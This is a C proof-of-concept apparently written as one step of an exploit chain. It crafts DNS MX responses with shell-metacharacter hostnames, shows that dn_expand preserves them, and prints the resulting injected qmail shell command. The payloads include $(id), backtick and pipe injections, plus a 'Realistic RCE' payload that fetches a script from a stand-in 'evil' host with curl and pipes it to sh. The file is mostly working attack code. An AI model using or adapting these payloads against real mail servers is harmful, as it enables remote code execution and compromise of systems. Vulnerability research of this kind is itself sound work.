/*
 * Link 1 validation: Prove that dn_expand() preserves shell metacharacters
 * that enable command injection even when ; is escaped.
 * 
 * Key insight: dn_expand escapes ; . " \ but NOT ' $ ` ( ) | & > <
 * So we can use single-quote escaping + $() command substitution.
 */
#include <stdio.h>
#include <string.h>
#include <arpa/nameser.h>
#include <resolv.h>

/* Build a DNS response with an MX record containing a crafted exchange hostname */
int build_dns_response(unsigned char *response, int maxlen, const char *label) {
    int label_len = strlen(label);
    memset(response, 0, maxlen);
    
    /* DNS header (12 bytes): 1 question, 1 answer */
    response[0] = 0x00; response[1] = 0x01; /* TxID */
    response[2] = 0x84; response[3] = 0x00; /* Flags: QR=1, AA=1 */
    response[4] = 0x00; response[5] = 0x01; /* QDCOUNT=1 */
    response[6] = 0x00; response[7] = 0x01; /* ANCOUNT=1 */
    
    int pos = 12;
    
    /* Question: example.com MX IN */
    response[pos++] = 7;
    memcpy(response + pos, "example", 7); pos += 7;
    response[pos++] = 3;
    memcpy(response + pos, "com", 3); pos += 3;
    response[pos++] = 0;
    response[pos++] = 0x00; response[pos++] = 0x0f; /* MX */
    response[pos++] = 0x00; response[pos++] = 0x01; /* IN */
    
    /* Answer: MX record */
    response[pos++] = 0xc0; response[pos++] = 0x0c; /* ptr to question name */
    response[pos++] = 0x00; response[pos++] = 0x0f; /* MX */
    response[pos++] = 0x00; response[pos++] = 0x01; /* IN */
    response[pos++] = 0x00; response[pos++] = 0x00;
    response[pos++] = 0x0e; response[pos++] = 0x10; /* TTL */
    
    int rdlen_pos = pos; pos += 2;
    int rdata_start = pos;
    
    response[pos++] = 0x00; response[pos++] = 0x0a; /* MX pref=10 */
    
    /* Crafted label with shell metacharacters */
    response[pos++] = (unsigned char)label_len;
    memcpy(response + pos, label, label_len); pos += label_len;
    
    /* .example.com */
    response[pos++] = 7;
    memcpy(response + pos, "example", 7); pos += 7;
    response[pos++] = 3;
    memcpy(response + pos, "com", 3); pos += 3;
    response[pos++] = 0;
    
    int rdlen = pos - rdata_start;
    response[rdlen_pos] = (rdlen >> 8) & 0xff;
    response[rdlen_pos + 1] = rdlen & 0xff;
    
    return pos;
}

void test_payload(const char *label, const char *desc) {
    unsigned char response[512];
    int responselen = build_dns_response(response, sizeof(response), label);
    
    char name[MAXDNAME];
    unsigned char *responseend = response + responselen;
    
    /* Calculate position of MX exchange field */
    int question_end = 12 + 1 + 7 + 1 + 3 + 1 + 4;
    unsigned char *mx_exchange = response + question_end + 2 + 10 + 2;
    
    int result = dn_expand(response, responseend, mx_exchange, name, MAXDNAME);
    
    if (result < 0) {
        printf("[%s] FAIL: dn_expand returned %d\n", desc, result);
        return;
    }
    
    char acfcommand[2048];
    sprintf(acfcommand, "/bin/touch /var/qmail/control/notlshosts/'%s'", name);
    
    printf("=== %s ===\n", desc);
    printf("DNS label bytes: %s\n", label);
    printf("dn_expand output: %s\n", name);
    printf("Shell command:    %s\n\n", acfcommand);
}

int main() {
    /* Test 1: Single quote + $() command substitution */
    test_payload("x'$(id)'y", "Single quote + $() substitution");
    
    /* Test 2: Single quote + backtick command substitution */
    test_payload("x'`id`'y", "Single quote + backtick substitution");
    
    /* Test 3: Single quote + pipe */
    test_payload("x'|id|echo 'y", "Single quote + pipe");
    
    /* Test 4: Just dollar-paren (without quote break) */
    test_payload("$(id)", "Dollar-paren only");
    
    /* Test 5: Realistic RCE payload */
    test_payload("x'$(curl$IFS-s$IFS" "http://evil/s|sh)'y", "Realistic RCE");
    
    /* Test various special chars to see which survive */
    printf("=== Character survival test ===\n");
    const char *chars[] = {"'", "$", "`", "(", ")", "|", "&", ">", "<", ";", "\\", "\"", ".", NULL};
    for (int i = 0; chars[i]; i++) {
        unsigned char resp[512];
        char label[64];
        snprintf(label, sizeof(label), "test%stest", chars[i]);
        int rlen = build_dns_response(resp, sizeof(resp), label);
        char name[MAXDNAME];
        int r = dn_expand(resp, resp + rlen, resp + (12+1+7+1+3+1+4) + 2+10+2, name, MAXDNAME);
        if (r >= 0) {
            int escaped = (strlen(name) > strlen(label) + 12); /* rough check */
            printf("  char '%s' -> dn_expand: '%s' %s\n", chars[i], name, 
                   strstr(name, "\\") && !strstr(label, "\\") ? "(ESCAPED)" : "(preserved)");
        }
    }
    
    return 0;
}
